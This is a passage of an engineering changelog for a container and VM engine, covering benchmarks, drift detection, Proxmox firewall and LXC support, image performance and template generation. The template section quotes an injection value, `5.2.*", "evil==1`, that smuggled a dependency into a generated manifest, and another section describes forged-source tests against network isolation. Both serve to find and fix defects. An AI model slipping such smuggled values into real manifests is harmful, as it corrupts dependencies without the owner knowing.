docker and podman are **anchors**: if they degraded as much as we did, what changed was the
bench, and the gate says so instead of accusing the engine. With no anchor there is no
way to tell the two apart, and there too it refuses — guessing would repeat the
error that took it out of that battery.

**The baseline is per MACHINE, and that is not bureaucracy.** A median of 87 ms
measured on a 32-thread desktop says nothing about a 2-vCPU VM; comparing the
two would fabricate exactly the noise the gate exists to filter. That is why
`bench_baseline.json` is a LIST of entries, each stamped with the machine,
and a run on an unknown machine is refused with the command that records one.

**A measurement can pass the load threshold and still be garbage** — and this is what
forced a second ceiling. Measured on 2026-09-23 with **load 6.44**, well below the
limit: a line of ten docker samples ranged from **434 ms to 5 407 ms**. The
median absorbed it and the load threshold does not see it, because the contention that scatters
I/O does not appear in load(1m). `bench.sh` started publishing the **spread**
(max/min) of each line, and the gate judging it: above **3×** it does not judge. **Recording
is stricter — 1.5×** — and the asymmetry is the point: a judgement run
is thrown away, a baseline is reused by every one that comes after. The number
that forced it: a run at load 8.27 gave delonix a spread of **2.69×** and a median
of **165 ms**, which would have been recorded for an engine that did **87 ms** minutes
later on the same machine.

**`time_n` started looking at the exit status.** It did not look at all: a
tool installed but unusable — the common case is `docker` with the daemon
stopped — fails in tens of milliseconds and entered the table as the fastest
of the three. Now a failed sample discards the LINE, which comes out `null` in the
JSON and «not measured» in the report.

**Baseline recorded on this machine (2026-09-23, `ceec7f8c`, delonix 4.3.0,
load 3.23):** docker **224 ms**, podman **279 ms**, delonix **87 ms**, spreads
1.15× / 1.14× / 1.28×.

**Validated live, all six outcomes**: within tolerance (×1.00); regression
with stable anchors (×2.17 → **1**); anchors equally degraded (→ **3**, «the
machine changed»); non-publishable run; machine with no baseline; and the recording
refused for spread. The first two and the third against the REAL measurement
of this machine, not against invented numbers.

**In CI, this stays `skipped` today, and the job comment says so.** The hosted
runner blocks unprivileged user namespaces, so the rootless engine does not
run there — the same thing that already keeps the chaos harness out. The probe lives in a separate JOB
for the reason measured in `chaos.yml`: a step `if` skips steps and the job
reports `success` all the same — a green that measured nothing.

**Along the way, a dead gate**: the `scripts/test_*.py` never ran in CI. The
`ci.yml` invokes seven Python scripts as gates and did not invoke a single one of their
tests — `test_release_verify.py` was born yesterday with ten tests that nothing
executed. The `script-tests` job runs them all, and fails if it finds none.

## `delonix drift` — what the MACHINE changed, without the manifest in the comparison (M05)

`stack plan` answers «what an apply would do». That answer mixes two
things with different origins: the edits someone just made to the
FILE and the edits someone made to the NODE. The `plan`'s own `--help`
admitted the limit — «with the manifest unchanged, whatever it prints IS drift» —
and it is that condition that makes it unusable as a gate: it is only drift while
no one touches the file, and in a PR the file always changed.

This verb takes the manifest out of the comparison and keeps the two faces that
belong to the node: the spec stamped on each resource at the last apply
(`delonix.io/last-applied`) and what it is now. Whatever differs happened OUTSIDE
the declarative path — a `container update`, a hand-written `nft`, someone
resolving an incident at 3 in the morning.

- **The manifest is OPTIONAL, and that is what gives it the primary use case.** Most
  of the `actual()` functions sweep their own store (`container`, `volume`,
  `network`, `netroute`, `service`, `ippool`, `pod`, `vm`,
  `network_access_rule`) and need no document: on a node without the
  repository the command answers all the same. The ones that need it — `RuntimePolicy`,
  `Image`, `App`, `NetworkPolicy`, `HTTPRoute`, `Gateway` — are **NAMED in the
  output** instead of omitted; a shorter table reads as «clean node», which
  is the dishonesty this repo chases everywhere.
- **A resource without a stamp is a THIRD STATE, not drift.** Created by hand, or
  adopted by a version predating the stamp: there is no recorded intent to
  compare against. Calling it drift would be inventing a baseline; hiding it
  was worse. It is counted and named (`unstamped`).
- **Only the keys the stamp carries are compared.** A field present in the
  observed and absent from the stamp is an engine default the apply never
  set — reporting it would bury the line that matters under a screen of
  noise. There is a test for both directions (the field that moved, and the default that
  does not count).
- **`--detailed-exitcode` returns 2 when there is drift**, the same contract as
  `plan` and `diff`, which is what a CI gate consumes.

**The gate behind the list of document-dependent Kinds, and the error
it caught on the first run.** The constant `DOC_SCOPED` would be the seventh
list in this repository that has to agree with another and stops agreeing
silently — so it is not just a constant: the test
`doc_scoped_matches_the_stack_wiring` reads `stack.rs` and compares. On the first
pass it failed for a reason I had not seen: the
`network_access_rule::actual` is called with `docs` like the others **and ignores them**
(`fn actual(_docs: …)`). Reading the call-site was not enough; the gate started reading
the SIGNATURE of each candidate too, and `NetworkAccessRule` dropped off the list —
warning about a Kind the command can enumerate perfectly spends the
same credit as forgetting one it cannot.

**Validated live** (isolated root, tree binary): `stack apply` of a
container with `memory: 64M` → clean `drift`; `container update --memory 128M`
(the hand-tweak) → the table shows `memory  64M → 128M`; `--detailed-exitcode`
returns **2**; `-o json` carries the three sections; **from another directory and without a
manifest** the drift still appears, with the six unchecked Kinds
named; and with the stamp removed from the registry by hand (the case of the resource
adopted by an old version) the output becomes `1 resource(s) carry no
last-applied stamp`, without a drift line.

## `compatibility compose` and `migrate assess` — the third state needs a denominator (M02)

`compatibility docker` has published three states since it existed: served,
refused with a reason, missing. `compose` did not have the third, and the module
itself said why — «it has an allowlist but no three-state surface of its
own to reuse». The reason was right and it was the WORK, not a reason
to stay out: the «missing» state needs a DENOMINATOR, and the
denominator is the list of keys of the specification itself.

**The list was MEASURED, not written from memory.** A minimal compose file per
candidate key, `docker compose config` on each one, and only what the client
ACCEPTED remained: **89 service keys and 8 top-level**, against docker **v29.8.1**, on
2026-09-23. Four candidates were refused at first and none because they did not
exist — they were invalid values of mine (`container_name: "x"` does not pass the pattern,
`cpu_rt_*` want a number, and `image` was already in the probe's base document).
Writing the list by heart would have inflated the denominator with names the
specification does not have, and every percentage on top of it.

**Today: 28 served, 12 refused with a reason, 49 missing, of 89.** At the top, 7
served and 1 refused, of 8.

**The table DESCRIBES the behaviour, and there is a check that requires it.** The two things
are read a command apart: someone reads `served` and takes an error, or reads
`missing` and never tries. The battery's check does not compare the table against
itself — it takes each of the 88 keys it classifies, writes a file
that uses it, and asks `compose config` what happens. All 88 agree.

**Two findings while building this:**

1. **The table I was going to write ALREADY EXISTED.** I started a `MISSING_ELSEWHERE`
   with the keys whose equivalent the engine has in another command, and `compose` already
   had the `ENGINE_HAS_IT_SERVICE`, used to REFUSE with the message that names
   the flag. Two lists that have to agree are two lists that will diverge —
   mine was deleted and the matrix started deriving from the one that already governed the
   behaviour. It was the cross-test above that exposed it: mine said `missing`
   where the engine says `refused`.
2. **`ENGINE_HAS_IT_SERVICE` was incomplete, and that cost the wrong
   message.** `sysctls`, `ulimits`, `gpus` and `userns_mode` all have a flag on
   `container run` (measured against the real `--help`, not assumed) and fell into the
   generic «not understood» error, which sends the reader away instead of telling them
   where to go. They entered the table, and the test that checked two lines by hand started
   walking all twelve — it was a test over two lines that let this slip.

**`migrate assess` is the other half, and the rationale is fail-closed.** The
`compose up` stops at the first key it does not understand, and that is right for RUNNING;
to DECIDE it is useless — a migration needs the whole list at once, not an
edit-and-retry cycle per obstacle. `assess` reads the YAML **raw** (the typed
parser would refuse at the first unknown, which is precisely the set to
enumerate), creates and pulls nothing, and counts USES of a key and not distinct keys:
three services with `devices:` are three decisions. The `x-` extensions do not count —
they are the specification's own escape hatch and no one reads them.

**`cri` and `oci` stay out, for reasons different from each other.** The CRI
number lives in a hand-maintained document (`docs/cri-conformance.md`, produced by
running `critest` on a node) and nothing in this binary can derive it: a
`compatibility cri` would be a second copy of a number with no way to notice
its ageing. OCI has no conformance work at all in this repository,
so the honest count is zero, and a command that prints an empty table
teaches nothing.

## The per-VM firewall of the Proxmox node is the second provider of the `firewall` domain (ADR-0052)

Until now the `firewall` domain of the catalog had a single provider: the holder's nftables chain
(`linux`), which only filters containers. A VM on a Proxmox node was outside any engine rule.
The client already talked to each VM's own firewall (#492, #496, tested live),
but no engine code called it. Now `kind: NetworkPolicy` with `scope: vm` puts the
policy on the node's firewall, through `VmBackend::apply_firewall`/`read_firewall`. On the other
backends these methods refuse by name (DX-1501).

- **Three switches, and only one is ours to flip.** A VM's rules only filter with the
  DATACENTER `enable`, the VM's `enable` and `firewall=1` on `net0`. The engine flips the last
  two and **refuses with DX-6508** when the first is off, before any write.
  Flipping it changes what the nodes accept, and it was measured: in the lab it cut off access to the node (API and ping),
  because the appliance's `/etc/hosts` still points `pve` at the build's `10.0.2.15` and the
  firewall detected only `127.0.0.0/8` as the local network. Recovered via the serial console, with a
  `management` IPSet. **The appliance defect is left unfixed** (`scripts/appliances/`).
- **Ownership by comment** `delonix-managed:<n>`: the node stores rules only by position, and the
  operator may add rules by hand. A rule without the label is never deleted and never counts
  as drift. The node inserts at the TOP, so the rules are written in reverse and end up on
  top of the hand-made ones. The default policy is written LAST, so that a `deny`
  never takes effect before the `allow`s are written.
- **Order is meaning** only in `scope: vm` (the node evaluates in order and the first rule that
  matches wins), so `plan` compares the list without ordering it. `fromWorkload` is refused,
  because it resolves to an address of the engine's SDN, where the VM is not.
- **Proven**: the live case `a_scope_vm_policy_lands_on_the_nodes_own_firewall_and_reads_back`
  on both branches (refusal with the datacenter off; full cycle with it on). Via the CLI:
  `stack apply`, then `plan` with code 0; a change in the manifest gives `~` and converges
  hot; a rule deleted by hand on the node gives code 2 and is restored. The chain `tap<vmid>i0-IN` that
  `pve-firewall` compiled was read once by hand and had the rules in order, with `DROP`
  at the end. **The four `firewall.*` lines stay `partial`**: no packet crosses the VM in
  any test.
- **The perimeter via `/cluster/firewall` was NOT done**: ADR-0049 D3 excludes those writes
  as provider administration, and the datacenter rules guard the NODES, not the VMs. Only
  the read `GET /cluster/firewall/options` went in.

## `workload.usage` in `delonix-mcp` — counters, not rates (2026-09-27)

A new read-only tool in the MCP server: a sample of the CUMULATIVE counters of each
container (cgroup leaf) and of each local VM (the VMM process, via `/proc`), with the ceilings
in force. The module is `delonix_linux::usage`; the tool only assembles the lines.

- **The engine keeps no history, and the tool does not pretend it does.** It is daemonless: nothing is
  awake between two commands to record a series. It returns what the kernel already counts
  (`cpu.stat usage_usec`, `io.stat`, `utime+stime`) and the `process_started_at_unix` of the owner of the
  counters. Whoever samples twice has a rate; whoever sees that time change knows the
  counters restarted and does not subtract across it. Window, quantiles and retention belong to whoever
  keeps the samples.
- **A missing number comes in `unmeasured`, with the reason, never as zero.** On a rootless leaf
  without delegated `io` the `io.stat` does not exist, and the reason says so. An empty `io.stat` is a true
  zero (nothing read yet) and is returned as zero.
- **Two bases, and they are not the same quantity** (`basis`): `cgroup` for a container,
  `vmm_process` for a VM. A VM's memory is the resident set of the VMM on this host, not the guest's
  usage; the line says so in `limitations`. libvirt and remote VMs have no registered pid
  and appear as `sampled: false` with the backend named.
- **The pid's identity is verified** (`is_live`: pid + `starttime`). A recycled pid is not
  sampled — without this the tool would report a foreign process as the VMM.
- **Network only on request** (`include_network`): it costs one `nsenter` per container.
- **Validated live** (isolated root, both roots): a container with `--cpus 0.5` burning
  CPU gave **0.498 cores** between two samples 3 s apart, `cpu.max 50000/100000` and
  `memory.max` of 64 MiB read from the real cgroup; I/O in `unmeasured` because this host does not delegate
  `io`. **Not validated live**: a real Cloud Hypervisor VM (the VMM path is covered
  by tests with a fake `/proc` and with the test process itself) and the network of a container
  on a custom network.

## A system container on Proxmox is a door of its own, not a `Container` (ADR-0058, plan 63)

ADR-0058 decided, after a spike on PVE 9.2.2, that a Proxmox LXC does not serve
`kind: Container`: the API has no `exec`, logs or exit code, and the engine's dataplane does not
reach there. It enters as a resource of its own, with semantics close to a VM. Slices 0 through 4 and 6 of plan
63 are merged (#546, #571, #574, #576, #579, #582 and the close); slice 5 (day 2) only enters on request.

- **The archive the node accepts** (Slice 1): `delonix_oci::write_oci_media_archive` rewrites only the
  manifest with OCI media types. The node refuses the Docker v2 of `image save` with «Unsupported CPU
  architecture», a message that names the wrong cause. `image save` stays on Docker v2.
- **An image sent once** (Slice 2): `Client::stage_template` sends it as `vztmpl`, with the
  name `dlx-<hex>.tar` taken from the manifest digest (the tag is not identity: the node's own pull
  does not keep a digest). The node verifies the sha256: a wrong checksum ends in «checksum mismatch» and the
  node keeps nothing.
- **The door** (Slice 3): `delonix_compute::system_container`. The provider lives in
  `delonix-proxmox/src/lxc.rs`, and the three measured rules are the ones from the spike:
  - **T2:** create without `entrypoint`/`env` (the node replaces them with those from the image), write them with
    `PUT …/config`, re-read and compare. A difference destroys the container.
  - **T3:** a start whose DHCP got no answer ends in `WARNINGS: 1`. The start
    succeeds, and the network is `NotReady` with the node's warning.
  - **Privilege:** `unprivileged: false` is refused by name (DX-1540).
- **The catalog went to 1.2.0** (domain `system-containers`). `exec`, logs and exit code
  stay `unsupported-by-provider` with the measured reason. The image and the network stay `partial`: a full
  copy per container (T6), and the node's bridge and VLAN without the engine's SDN (T7).
- **The Kind** (Slice 4): `kind: SystemContainer`, in `cmd/system_container.rs`. The module is the composition root
  (it reads the same Proxmox configuration the VMs do). The engine pulls the image and writes the
  OCI archive. The registry keeps the locator. What the container IS (memory, swap, cores,
  entrypoint, env) is read from the node on every plan, so a `PUT` done by hand on the node is drift (the
  `plan` gives 2 and the `drift` shows it).
  - **Fields:** `memory`, `swap` and `cores` are hot, measured on a running container (the node
    writes them to the cgroup and to the cpuset). The rest is cold: it plans a `Replace`, refused without
    `--replace SystemContainer/<name>`.
  - **Undeclared entrypoint and env** stay out of the comparison: the node has the image's.
- **Day 2 (Slice 5, on request; D3 was revised):** the ad-hoc stuff lives in `delonix systemcontainer`.
  The snapshots (`snapshot create|ls|rm|restore`) are done. A `restore` of a running container
  waits for `running`: measured, the node goes ~40 s without responding for the container after the rollback
  task, and the pveproxy gives HTTP 596 to whoever waits. «The task finished» is not «the container responds».
  The `rootfs` is the reconciler's first **grow-only** field (`grow_only_fields`): it grows
  hot, shrinking plans a `Replace`. The same function (`is_hot_change`) decides in `plan` and in
  `apply`, so the two never disagree about what requires recreation.
  The backup (`backup create systemcontainer`) archives to the NODE's storage; the verbs `ls`/`inspect`/
  `restore`/`remove` recognize the archive by name (`<storage>:backup/vzdump-lxc-…`). **A
  restore via API token drops the raw `lxc.*` keys** (measured: `lxc.signal.halt`,
  `lxc.init.cwd`; only `root@pam` writes them), and the restore names each one. And the timer of
  `backup schedule` ran a form the CLI no longer accepted — **a test that pins an argv
  has to pass it through the parser**, otherwise it pins the defect.
  The clone (`systemcontainer clone`) is always full; of a running container, via a snapshot
  temporary that the provider deletes. **And two assertions that proved nothing**: `destroy` read
  any error from `config` as «no longer exists» (a transport error made it return success
  without destroying, measured), and the «no volume left» of the LXC cases read `content=images`, where the volume
  of a container (`rootdir`) never appears. A check for absence has to be able to see the
  presence — you prove first that it sees the LIVE resource.
  The firewall enters via `kind: NetworkPolicy` with `scope: systemcontainer`, through the SAME code as
  `scope: vm` (`GuestFirewall`, one QEMU implementation and one LXC): ownership by comment, datacenter
  refused when off, `firewall=1` on `net0`. A container without `net0` is refused before
  any rule. `partial`, like the `scope: vm` lines: no packet crossed the container.
  The migration (`systemcontainer move --node`) is offline: the node does not move a running container
  hot (`online=1` is accepted and the task fails), and its `restart=1` shuts down with `--nokill` and
  **aborts** when the init ignores the SIGTERM, with the container still on the source and `pvesh` exiting 0.
  The provider stops it itself, migrates and starts on the destination; a volume the destination does not share
  is copied whole, so it asks for `--with-local-disks` (DX-5517).
  Each operation resolves the container via `located`: a registry entry left pointing to the old node
  (a session killed halfway through `move`) is followed via `/cluster/resources`, instead of read as
  absent — which would plan a second container.
- **A privilege field in the manifest is refused, not ignored** (Slice 6). `unprivileged`,
  `privileged`, `features` and `nesting` gave «unknown field — ignored», and with a configured
  node the `apply` created an unprivileged container and exited with 0 — the opposite of the request.
  Now they exit with DX-1540 in `desired` and in `apply_one`, before resolving the provider, so the
  refusal beats DX-6000 even without a node. **Since 2026-10-03 the refusal runs at manifest load** (`manifest::refused_by_name`), before the
  unknown-field check: with the strict manifests (#682) that check spoke
  first and answered DX-1000 «unknown field — check the spelling» to a well-spelled field; only the
  E2E battery showed it (2 FAIL), because it does not run in CI. Gate: the «kind: SystemContainer — the refusals that
  do not need a node» section of `scripts/e2e.sh` (7 checks; 3 fail with the refusal reverted,
  verified). The zstd layer (DX-1409) stays in the `delonix-oci` unit test: via the Kind you only
  get there with a node.

## Image performance: pull, push, build and start (2026-09-26 to 2026-09-29, 14 PRs)

A survey with three performance agents, and then one fix per item, each with its
own measurement in the PR. The numbers below are those that held up with the machine calm; those that only
measured under load say so.

- **Pull and push in streaming, without the whole blob in memory** (#520/#535, #523, #524). The CAS
  writes to a temporary file and computes the sha256 as it goes, with the disk write on a
  thread of its own (a bigger buffer did not do it: only the thread removed the tails). Memory on the pull of
  `node:22`: 214 → 27 MB; on the VM pull: 278 → 13 MB, and it resumes across processes (a `kill -9` partway
  through left 48.6 MB and the next pull continued from there, with the right digest); on the VM push:
  837 → 10–13 MB.
- **The push retries and runs in parallel** (#526, #527). A PUT cut partway is repeated
  with a HEAD before each attempt (an already-accepted blob never goes twice); 5xx/408/429 and
  transport errors retry, the rest fail immediately. Four layers at once: `node:22` at
  20 MB/s per connection went from 65 s to 11 s.
- **Mount instead of sending** (U6, #538). If an image tag names another repository of the
  SAME registry, the upload asks `?mount=<digest>&from=<repo>`: 201 is the blob linked with no bytes, 202
  is a normal upload. Measured on ghcr: 356 s → 7.0 s. A token server that refuses the `pull`
  scope over the origin is asked again without it — an optimization can never make a push
  fail.
- **The hot pull does not rewrite the registry, and the CAS survives a crash** (#530). The
  `save_if_changed` compares ignoring the `created_unix`. The CAS's `fsync`s cost 18 calls per
  pull of `node:22` and zero in the total time with the machine calm (42–45 s on both sides, the pull is from
  the network). **The 19–30 s measured before were the host's disk saturated, not the `fsync`** — under high
  load, an I/O measurement measures the neighbour.
- **Build** (#529). The work container has `sleep infinity` as PID 1, which ignores the
  SIGTERM, so each `stop` spent the whole 5 s of tolerance; now it stops with 0. A step
  that hits the cache closes with `✓` (it closed with `✗` and the build exited 0). The per-app CNB cache stopped
  being deleted at the end of each build. Medians: cold 6.8 → 2.2 s, only the changed `COPY`
  7.2 → 1.1 s.
- **First start: layers in parallel, read in streaming** (P5, #533). Memory on the first
  `run` of `node:22`: 219 → 21 MB; extraction 4.3 → 2.1 s. The total time barely moved, and that is where
  the next finding came from.
- **A container's exit waits for the host's ENTIRE disk** (ADR-0056, #534 and #537). When the
  last process of the mount namespace exits, the overlay is unmounted and the kernel syncs the file
  system of the upper, which is the host's. An overlay with no write at all waited 29 s for 1 GB that
  ANOTHER file had to write. A `--rm` container (the upper is deleted on exit) now mounts
  with `volatile`: `run --rm … true` with 1 GB dirty on disk, 9.5–14 s → 0.14 s. **The
  `incompat/volatile` marker stays in the workdir even after a clean unmount**, and the kernel refuses the
  next mount: so the `work/` is emptied before each mount (a `--rm --restart` mounts
  twice). The kept containers stay as they were (D4 of the ADR). The `build`'s work
  containers have no overlay (flat rootfs), unlike what the ADR said in its first version.
- **`cluster load` on all nodes at the same time** (U9, #605): 3 nodes, 33.2 → 17.6 s.

**Decided not to do, or only after measuring, with the reason**:
- **P3, registry token cache on disk — DONE afterwards, by ADR-0060.** First refused
  for keeping a credential on disk; the measurement of the Docker Hub anonymous token (`sub` empty,
  `pull` over a public repository, 300 s) showed that a token requested WITHOUT credentials does not
  expose anything. Only those are kept (`auth/tokens/`, 0600), never with `image login` to the
  host nor on a push. Hot pull of `alpine:3.20`: 1.50–1.64 s → 0.94–0.99 s.
- **U3 step 2, resuming an upload partway — DONE afterwards, without the state `GET`.** It was
  refused because the state `GET` answers `303` on ghcr. It is not needed: measured on 2026-09-30,
  a `PATCH` cut partway leaves no bytes on ghcr, and repeating the block from the last confirmed
  `Range` is accepted. Three facts that only live proof gave, and each one broke the first version:
  - **ghcr accepts parts of at most 4 MiB** — with 16 MiB, each `PATCH` took a `416` and the push
    always FAILED. A `416` on byte 0 now cuts the part in half;
  - **`registry:2` keeps part of the cut block** and answers `404` to the `GET` and to the following
    `PATCH`es, these BEFORE reading the body (the client sees only a dropped connection). A session like that,
    or a resume that does not advance, is swapped for a new one: never worse than the single `PUT`;
  - **parts cost ~13–17% on ghcr** (one round trip per 4 MiB; 64 MiB: 30–34 s in a `PUT`,
    35–39 s in parts). So the first upload is still a single `PUT`; only after a
    failure does that client switch to resumable parts.

**Method traps of this series** (each cost a measurement or a PR):
- **A stacked PR does not run CI** while the base is not `main`, and `gh pr merge --delete-branch`
  on the parent CLOSES the child (the #520, continued in #535). Re-point the child before merging the parent, and
  redo the branch with only its own commits — those of the `ngola-ci` hook are merges.
- **`git checkout -- <file>` to undo a mutation deletes the uncommitted work of that
  file.** Keep a copy before the mutation and restore it.
- **With the host loaded (load 37–53 on 32 cores), a time decides nothing**: the same scenario
  gave 22.2 s and 1.2 s. Under load you measure what is deterministic (counts of steps, of `fsync`,
  of bytes, peak memory) and the time is left for a calm window.
- **A process in state D after the SIGKILL is not an engine bug**: `wb_wait_for_completion` is
  the exit waiting for the disk writeback. The `stop` gives up after 30 s and says 0; the process exits
  minutes later on a saturated host.
## The `delonix init` templates have a contract, and the generator checks what it substitutes (ADR-0061, 2026-10-01)

Measured with the `9eb2a14d` binary, generating each template in an empty directory and running the
commands from each one's README and CI: the documented CI **failed on a new project** (django
`ruff check` rc=1, node `pnpm lint` rc=1 for not having ESLint, django `pytest` rc=5), the `-v` and the
project name were copied without checking into manifests (`-v '5.2.*", "evil==1'`
added a dependency to `pyproject.toml`; a directory `My App"x` produced an
unreadable `package.json`), and the example service was two probes. All with exit 0.

- **The contract** (`docs/adr/0061-init-template-contract.md`): the seven application templates
  (`go`, `node`, `nestjs`, `nextjs`, `fastapi`, `django`, `laravel`) generate a small, complete
  service — one capability (notes) from transport to port, one error shape, configuration
  validated at startup, readiness `starting → ready → draining`, bounded shutdown,
  Standard Webhooks in both directions, OpenTelemetry, an OpenAPI contract with a drift test, a
  dependency-direction test and a single-trace test. `odoo` and `nginx`/`httpd`/`haproxy` have
  another contract (ERP deployment; infrastructure).
- **The `template.meta` is the interface between a template and the generator**: `port=`, `health=`,
  `version=`, `versions=` (the accepted `-v`), `lock=` (the package manager's lock, read by the
  adopt mode) and `wait=` (seconds that `--up` waits for health). A new template declares itself there; the
  `every_template_renders_valid_files_for_each_declared_version` test renders it for each
  version and parses the JSON/YAML it wrote, without needing its own test.
- **Locks**: only `go.sum` is embedded (the `go.mod` pins exact versions, so the hashes are a
  function of the manifest). For uv/pnpm/Composer an embedded lock would go stale on every `-v`; the
  first install generates it, the CI refuses to run without it, and the Delonixfile uses it when it exists.
- **The generator never runs a package manager** nor goes to the network.

**Pitfalls measured, for whoever touches a template:**

- **The length of the project name changes the length of the lines.** A `format:check` that
  passes with `my-svc` can fail with a 63-character name. The `__NAME__`/`__PORT__` tokens
  live in a constants file, and the formatter runs only over code (never over Markdown).
  It is tested with a long name.
- **`| grep -q` kills the generator midway.** A pipe that closes early delivers SIGPIPE to `delonix init`
  and leaves the project half done — it looks like a partial-write bug and it is the test's. The
  output is captured and compared afterwards.
- **A port occupied by another service makes a smoke pass or fail by the wrong service.** That is
  how it came out that `smoke.sh` did not accept `"id": "…"` with a space (the JSON of another
  framework). The owner of the port is confirmed before measuring.
- **An empty skeleton is worse than a missing directory.** The first `.dockerignore` of this
  engine descended into the entire excluded directory as soon as there was a `!` rule, and left the
  folder tree empty: an empty `.venv` made `uv sync` refuse («not a valid Python
  environment»). Only the real build showed it — the unit test had no exception at all.
- **An empty list of processors is not «no export»** in Node's OpenTelemetry SDK: the
  provider is not registered and the `trace_id`s come out as zeros. A null processor is used.
- **The SDK's export errors come out as free text on stderr** if nobody installs a
  handler — outside the logs' JSON format. Each template routes them to the logger.
- **`delonix build` is not `docker build`**: until this series it did not read `.dockerignore`, it threw
  away the sources in the middle of a `COPY a b dst/` and followed symlinks inside a copied
  tree (a pnpm `node_modules` could not be copied between stages). An image «validated with
  docker» is not validated.

**Second pass (2026-10-01): the pending items closed in rootless, and what only execution showed.**

- **The seven images run without root.** Each Delonixfile ends in `USER` (`app`, uid 10001, created
  in the image; `node`, uid 1000, in the three Node ones) and each manifest names it with `user:` — the
  engine only applies an image's USER when the manifest asks for it (ADR-0062). The user owns
  nothing in the image except the mount point of a volume. Measured on both engines (this branch
  alone, and with the P1 of ADR-0062): `id` is the unprivileged user, `CapEff` 0, `/etc/passwd`
  stays `0:0` and writing is refused.
- **The generated CI is EXECUTED, not just read** (`scripts/init-ci.sh`): it generates each template and runs, in a
  clean rootless container with the image that `.gitlab-ci.yml` names, the lock creation, the
  GitLab job exactly as written, and each `run:` step of the GitHub workflow. Only the
  `uses:` actions go unexecuted. It was this run — and not reading the YAML, which already passed —
  that found four defects:
  - `nestjs`'s `prettier --check .` failed on `.pnpm-store`, which pnpm creates INSIDE the
    project when it is on its own mount (a runner);
  - `laravel`'s GitLab job runs as root, and Composer aborts a script that needs a
    plugin without `COMPOSER_ALLOW_SUPERUSER=1`;
  - the default seccomp profile denied `fchmodat2`, so GNU `tar` could not set the
    mode on any directory (579 × «Cannot change mode») and no `docker-php-ext-install`
    compiled in a container. It was also the reason `pcntl` would not compile under `delonix build`,
    which the first pass attributed, by reading, to file ownership;
  - the last stage's `ENV` was packed twice, the second time by expanding: `ENV
    PATH=/app/.venv/bin:$PATH` produced an image whose PATH was that literal string. The service
    ran (the command lives in the single directory that remained) and `exec <c> id` exited 127 silently.
- **The seven templates ran their generated CI** (2026-10-02, `cfd46e01` binary, isolated
  root): `node` (4 GitHub `run:` steps), `nestjs` (8), `nextjs` (5) and `django` (8), each
  one with the GitLab job, without failures. `go`, `laravel` and `fastapi` had run before.
- **«Validated» with the image responding is not validated.** The four passed the smoke. The broken
  PATH only showed up when running `id` inside, and the `exec` of a nonexistent command said
  nothing — now it says the same as init (`delonix: exec <program>: <errno>`).
- **A directory with uppercase or spaces gives a derived name, stated in the output**; an explicit
  `--name` is still used or refused, never rewritten.
- **`django` migrates at startup** when `MIGRATE_ON_START=true` (the manifest sets it: one
  replica in SQLite). gunicorn never migrates.
- **Two `target`s for two trees.** A `CARGO_TARGET_DIR` shared between this branch and the
  validation one (with the P1) reused the `delonix-compute` from the other tree and compilation failed on
  symbols that existed in the code — the pitfall already written in «two copies of the same repo are not
  two builds».
- **With the host disk saturated, the `stop` and the `rm -f` of a kept container take long or give
  DX-8101** (PID 1 stays in `D`, `wb_wait_for_completion`): it is ADR-0056 D4, it is not the
  templates'. Measured here with a `sleep` that wrote nothing, while another run filled the
  disk. Repeating the command resolves it.

## The anti-spoof never filtered anything, and moved to a `bridge` table (2026-10-02)

Found by the ADR-0065 (IPv6) spike and confirmed against the engine. The rule was
`ip dlxing fwdeny iifname <veth> ip saddr != <ip> drop`, one per port, and the counter
stayed at zero: traffic between two ports of the same bridge only reaches the IP layer via
`br_netfilter`, and there the `iifname` is the BRIDGE, never the port. Measured: a container with
`NET_ADMIN` forged the source and reached the neighbour (3/3); forging the address of a member
of another namespace pierced the isolation (0 packets with its own address, 3 with the forged one).
The fix from audit #3 for the VMs' tap («the same rule as the veth») inherited the
defect. **Lesson: a security rule is only proven when a forged packet is
counted as dropped** — the audit read the ruleset and saw the rule there.

- **`table bridge dlxspoof`, hook `prerouting`**, where the `iifname` is the port. It pins
  per port the MAC (`macs`), the exact IPv4 source (`src`) or an authorized prefix
  (`srcpfx`, ranges), and the IP and MAC of the ARP sender. DHCP and ARP probes from `0.0.0.0`
  pass (a VM has no address before the lease); 802.1Q/802.1ad frames from a pinned
  port drop. A set read in JSON (`nft -j`) is what `spoof_forget` uses to
  remove a port's elements: port names get reused.
- **Containers**: the holder's `attach`/`attach-extra` pin the veth to the IP and the MAC read
  in the netns. **VMs**: the client sends `spoofbind <tap> <ip> <mac>` after the `vmtap`, for
  ALL VMs with a lease — the `default` namespace included, which the short `vmtap` line
  never carried. A control plane from an older binary does not know the verb: it warns
  and proceeds (it was as inert before as after).
- **Kind nodes**: kindnet routes the cluster CIDR without masquerade, so pod traffic
  between nodes leaves with the pod's source. After the nodes are `Ready`, the
  `cluster create` reads each node's `.spec.podCIDR`, requires it to be a canonical prefix,
  inside the `podSubnet` and STRICTLY narrower, and authorizes it only on that node's
  interface (`spoofallow`), storing it in `Container.allowed_sources` for `start` to restore it.
  Measured on a 2-node cluster: pod↔pod ping between nodes 3/3 in both directions; the worker
  sourcing from the control-plane's PodCIDR is cut (the `curl` times out, counter
  +3) and with its own one it gets the RST. **Test pitfall**: against a NODE's IP
  kindnet masquerades and the forged source never reaches the wire — the destination has to be
  inside the pods' CIDR.
- **Upgrade**: the rule is installed by the control plane; it only takes hold on a node after
  `delonix net netns down` + `up`.
- **Grants, only by the administrator**: `container run --allow-source <a.b.c.d/len>`
  (repeatable, for a container that routes) and `--no-source-check` (exceptional).
  They are PERMISSIONS in the node policy (`allowedSourcePrefixes`, `allowSourceCheckOptOut`),
  the inverse of the ceilings alongside: without policy, nothing is granted, and `mode: warn` does not
  grant. A requested prefix has to be canonical and fit inside a granted one; the
  refusal is DX-7801 (exit 77) and lands in the event log, just like each granted use
  (`source-prefixes-allowed`, `source-check-off`). Stored in the registry
  (`allowed_sources`, `source_check_disabled`) and reapplied on each `start`. A
  policy with only grants no longer trips the `POLICY-SILENT` lint.
- `SystemContainer` has the block `spec.provider: { type: proxmox, spec: { swap, network } }` (2026-10-03): `lower_system_container_provider` folds it into the flat fields in `manifest::load`, the flat spelling stays valid and means the same, repeating a field in both places is refused. `examples/systemcontainer.yaml`.
- `NetworkGateway` accepts `spec.provider: { type }` (2026-10-03), folded into the scalar by `lower_network_gateway_provider`; `provider.spec` empty only. The Kind stays (generic perimeter vocabulary, not a Kind per provider resource). Only unit-tested: the lab's OPNsense VM does not boot.

## IPAM of a zone: the controller it names, and subnets changed in place (ADR-0063 D1/D2, 2026-10-09)

- **`spec.ipam`** of a `NetworkZone` (and `provider.spec.ipam` of a `kind: Network`, the zone
  definition that all of its networks have to repeat identically) names the controller; `pve` by default.
